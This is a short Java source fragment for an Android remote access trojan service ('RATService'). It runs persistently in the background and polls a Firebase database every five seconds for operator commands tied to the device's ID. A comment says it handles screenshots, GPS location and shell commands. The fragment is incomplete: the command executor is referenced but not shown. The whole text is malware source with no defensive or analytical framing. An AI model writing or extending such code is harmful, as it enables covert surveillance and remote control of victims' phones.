public class RATService extends Service {
    private FirebaseDatabase database;
    private String deviceId;
    
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        deviceId = getDeviceId();
        database = FirebaseDatabase.getInstance();
        
        // Auto-checkin every 5s
        new Timer().scheduleAtFixedRate(new TimerTask() {
            @Override
            public void run() {
                checkCommands();
            }
        }, 0, 5000);
        
        return START_STICKY;
    }
    
    private void checkCommands() {
        DatabaseReference ref = database.getReference("devices/" + deviceId);
        ref.addListenerForSingleValueEvent(new ValueEventListener() {
            @Override
            public void onDataChange(DataSnapshot snapshot) {
                executeCommands(snapshot);
            }
            // ... handle screenshots, GPS, shell, etc
        });
    }
}
